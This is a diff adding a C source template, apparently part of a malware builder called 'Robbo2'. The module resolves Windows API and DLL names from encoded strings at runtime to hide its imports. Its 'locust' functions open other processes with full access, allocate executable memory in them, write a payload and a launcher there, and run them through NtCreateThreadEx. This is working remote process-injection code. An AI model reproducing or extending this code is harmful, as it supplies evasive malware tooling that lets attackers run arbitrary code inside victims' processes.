@@ -1,0 +1,246 @@
+#!name##Robbo2Locust_C
+#!itemType##sfile
+#!info##Robbo Locust C file.
+#!lang##c
+#!addNameComp##True
+
+
+
+#include "robbo2.h"
+#include "robbo2_locust.h"
+
+
+// ------------------------ FUNCTION, DLL NAME --------------------------------------------
+
+// Psapi.dll
+static int raw_name_Psapi_dll[] = {
+    {{_ROBBO.EncodeStr("Psapi.dll")}}
+};
+
+// User32.dll
+static int raw_name_User32_dll[] = {
+    {{_ROBBO.EncodeStr("User32.dll")}}
+};
+
+
+// EnumProcesses
+static int raw_name_EnumProcesses[] = {
+    {{_ROBBO.EncodeStr("EnumProcesses")}}
+};
+
+// GetModuleBaseNameA
+static int raw_name_GetModuleBaseNameA[] = {
+    {{_ROBBO.EncodeStr("GetModuleBaseNameA")}}
+};
+
+// GetCurrentProcess
+static int raw_name_GetCurrentProcess[] = {
+    {{_ROBBO.EncodeStr("GetCurrentProcess")}}
+};
+
+// MessageBoxA
+static int raw_name_MessageBoxA[] = {
+    {{_ROBBO.EncodeStr("MessageBoxA")}}
+};
+
+// CreateProcessA
+static int raw_name_CreateProcessA[] = {
+    {{_ROBBO.EncodeStr("CreateProcessA")}}
+};
+
+
+// CreateThread
+static int raw_name_CreateThread[] = {
+    {{_ROBBO.EncodeStr("CreateThread")}}
+};
+
+// WaitForSingleObject
+static int raw_name_WaitForSingleObject[] = {
+    {{_ROBBO.EncodeStr("WaitForSingleObject")}}
+};
+
+// GetModuleFileNameA
+static int raw_name_GetModuleFileNameA[] = {
+    {{_ROBBO.EncodeStr("GetModuleFileNameA")}}
+};
+
+// GetTempPathA
+static int raw_name_GetTempPathA[] = {
+    {{_ROBBO.EncodeStr("GetTempPathA")}}
+};
+
+// ------------------------------------------- VARIABLES -------------------------------------------
+
+void *robbo_addr_psapi_dll = NULL;
+void *robbo_addr_user32_dll = NULL;
+
+
+// ------------------------------------- WinAPI Functions ---------------------------------------------------
+BOOL robbo_wapi_EnumProcesses(DWORD pid_list[], DWORD pid_list_size, LPDWORD bytes_writen) {
+    RtypeEnumProcesses enum_proc = robbo_get_function(raw_name_EnumProcesses, robbo_addr_psapi_dll);
+    return enum_proc(pid_list, pid_list_size, bytes_writen);
+}
+
+RtypeEnumProcesses robbo_faddr_EnumProcesses(void) {
+    return robbo_get_function(raw_name_EnumProcesses, robbo_addr_psapi_dll);
+}
+
+DWORD robbo_wapi_GetModuleBaseNameA(HANDLE proc_handle, HMODULE mod_handle, LPSTR buff, DWORD buff_size) {
+    RtypeGetModuleBaseNameA get_name = robbo_get_function(raw_name_GetModuleBaseNameA, robbo_addr_psapi_dll);
+    return get_name(proc_handle, mod_handle, buff, buff_size);
+}
+
+RtypeGetModuleBaseNameA robbo_faddr_GetModuleBaseNameA(void) {
+    return robbo_get_function(raw_name_GetModuleBaseNameA, robbo_addr_psapi_dll);
+}
+
+HANDLE robbo_wapi_GetCurrentProcess(void) {
+    RtypeGetCurrentProcess gproc = robbo_get_function(raw_name_GetCurrentProcess, robbo_addr_kernel32);
+    return gproc();
+}
+
+RtypeGetCurrentProcess robbo_faddr_GetCurrentProcess(void) {
+    return robbo_get_function(raw_name_GetCurrentProcess, robbo_addr_kernel32);
+}
+
+int robbo_wapi_MessageBoxA(HWND hWnd, LPCSTR msgText, LPCSTR title, UINT buttons) {
+    RtypeMessageBoxA msgb = robbo_get_function(raw_name_MessageBoxA, robbo_addr_user32_dll);
+    return msgb(hWnd, msgText, title, buttons);
+}
+
+RtypeMessageBoxA robbo_faddr_MessageBoxA(void) {
+    return robbo_get_function(raw_name_MessageBoxA, robbo_addr_user32_dll);
+}
+
+BOOL robbo_wapi_CreateProcessA(LPCSTR appName, LPSTR cmdLine, LPSECURITY_ATTRIBUTES procAttr, LPSECURITY_ATTRIBUTES thAttr, BOOL inhFlag, DWORD createFlag, LPVOID envPointer, LPCSTR currentDir, LPSTARTUPINFOA startInfo, LPPROCESS_INFORMATION procInfo) {
+    RtypeCreateProcessA new_proc = robbo_get_function(raw_name_CreateProcessA, robbo_addr_kernel32);
+    return new_proc(appName, cmdLine, procAttr, thAttr, inhFlag, createFlag, envPointer, currentDir, startInfo, procInfo);
+}
+
+RtypeCreateProcessA robbo_faddr_CreateProcessA(void) {
+    return robbo_get_function(raw_name_CreateProcessA, robbo_addr_kernel32);
+}
+
+HANDLE robbo_wapi_CreateThread(LPSECURITY_ATTRIBUTES lpSecAttr, SIZE_T stack_size, LPTHREAD_START_ROUTINE startFunc, LPVOID funArgs, DWORD createFlag, LPDWORD thID) {
+    RtypeCreateThread new_th = robbo_get_function(raw_name_CreateThread, robbo_addr_kernel32);
+    return new_th(lpSecAttr, stack_size, startFunc, funArgs, createFlag, thID);
+}
+
+RtypeCreateThread robbo_faddr_CreateThread(void) {
+    return robbo_get_function(raw_name_CreateThread, robbo_addr_kernel32);
+}
+
+DWORD robbo_wapi_WaitForSingleObject(HANDLE hHandle, DWORD milisec) {
+    RtypeWaitForSingleObject wfso = robbo_get_function(raw_name_WaitForSingleObject, robbo_addr_kernel32);
+    return wfso(hHandle, milisec);
+}
+
+RtypeWaitForSingleObject robbo_faddr_WaitForSingleObject(void) {
+    return robbo_get_function(raw_name_WaitForSingleObject, robbo_addr_kernel32);
+}
+
+DWORD robbo_wapi_GetModuleFileNameA(HMODULE mod_handle, LPSTR buff_name, DWORD buff_size) {
+    RtypeGetModuleFileNameA get_name = robbo_get_function(raw_name_GetModuleFileNameA, robbo_addr_kernel32);
+    return get_name(mod_handle, buff_name, buff_size);
+}
+
+RtypeGetModuleFileNameA robbo_faddr_GetModuleFileNameA(void) {
+    return robbo_get_function(raw_name_GetModuleFileNameA, robbo_addr_kernel32);
+}
+
+DWORD robbo_wapi_GetTempPathA(DWORD buff_size, LPSTR buff) {
+    RtypeGetTempPathA gtemp = robbo_get_function(raw_name_GetTempPathA, robbo_addr_kernel32);
+    return gtemp(buff_size, buff);
+}
+
+RtypeGetTempPathA robbo_faddr_GetTempPathA(void) {
+    return robbo_get_function(raw_name_GetTempPathA, robbo_addr_kernel32);
+}
+
+// ---------------------------------- LOCUST FUNCTIONS ---------------------------------------------
+
+HANDLE robbo_locust_open_process_info(DWORD pid) {
+    OBJECT_ATTRIBUTES objAtt;
+    ROBBO_INITIALIZE_OBJECT_ATTRIBUTES(&objAtt, NULL, 0, NULL, NULL);
+    HANDLE hProc;
+    CLIENT_ID cliID;
+    cliID.UniqueProcess = (PVOID)(uintptr_t)pid;
+    cliID.UniqueThread = 0;
+    NTSTATUS result = robbo_wapi_NtOpenProcess(&hProc, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAtt, &cliID);
+    if (result != 0) {
+        return 0;
+    }
+    else {
+        return hProc;
+    }
+}
+
+HANDLE robbo_locust_open_process_full(DWORD pid) {
+    OBJECT_ATTRIBUTES objAttr;
+    ROBBO_INITIALIZE_OBJECT_ATTRIBUTES(&objAttr, NULL, 0, NULL, NULL);
+    HANDLE hProc;
+    CLIENT_ID cliID;
+    cliID.UniqueProcess = (PVOID)(uintptr_t)pid;
+    cliID.UniqueThread = 0;
+    NTSTATUS result = robbo_wapi_NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &objAttr, &cliID);
+    return hProc;
+}
+
+int robbo_locust_inject_payload_basic(DWORD pid, PVOID payload, int payload_size, PVOID func_launch, int flaunch_size) {
+    HANDLE proc = robbo_locust_open_process_full(pid);
+    if (!proc) {
+        return 0;
+    }
+    PVOID pAddr = NULL;
+    SIZE_T pSize = payload_size + 256;
+    NTSTATUS pAlloc = robbo_wapi_NtAllocateVirtualMemory(proc, &pAddr, 0, &pSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (pAlloc != 0) {
+        goto CLOSE_HANDLE;
+    }
+
+    SIZE_T pbWriten;
+    NTSTATUS pWrite = robbo_wapi_NtWriteVirtualMemory(proc, pAddr, payload, payload_size, &pbWriten);
+    if (pWrite != 0 ) {
+        goto CLOSE_HANDLE;
+    }
+
+    PVOID fAddr = NULL;
+    SIZE_T fSize = flaunch_size;
+    NTSTATUS fAlloc = robbo_wapi_NtAllocateVirtualMemory(proc, &fAddr, 0, &fSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (fAlloc != 0) {
+        goto CLOSE_HANDLE;
+    }
+    SIZE_T fbWriten;
+    NTSTATUS fWrite = robbo_wapi_NtWriteVirtualMemory(proc, fAddr, func_launch, flaunch_size, &fbWriten);
+    if (fWrite != 0 ) {
+        goto CLOSE_HANDLE;
+    }
+
+    HANDLE myTh;
+    NTSTATUS sThread = robbo_wapi_NtCreateThreadEx(&myTh, THREAD_ALL_ACCESS, 0, proc, fAddr, pAddr, 0, 0, 0, 0, 0);
+    if (sThread != 0) {
+        goto CLOSE_HANDLE;
+    }
+
+    robbo_wapi_NtClose(proc);
+    return 1;
+
+
+
+    CLOSE_HANDLE:
+        robbo_wapi_NtClose(proc);
+        return 0;
+}
+
+
+// ----------------------------------- INIT FUNCTIONS --------------------------------------------------
+
+void robbo_locust_init_test(void) {
+    return;
+}
+
+void robbo_locust_initialize(void) {
+    robbo_addr_psapi_dll = robbo_load_dll_ldr(raw_name_Psapi_dll);
+    robbo_addr_user32_dll = robbo_load_dll_ldr(raw_name_User32_dll);
+}
+
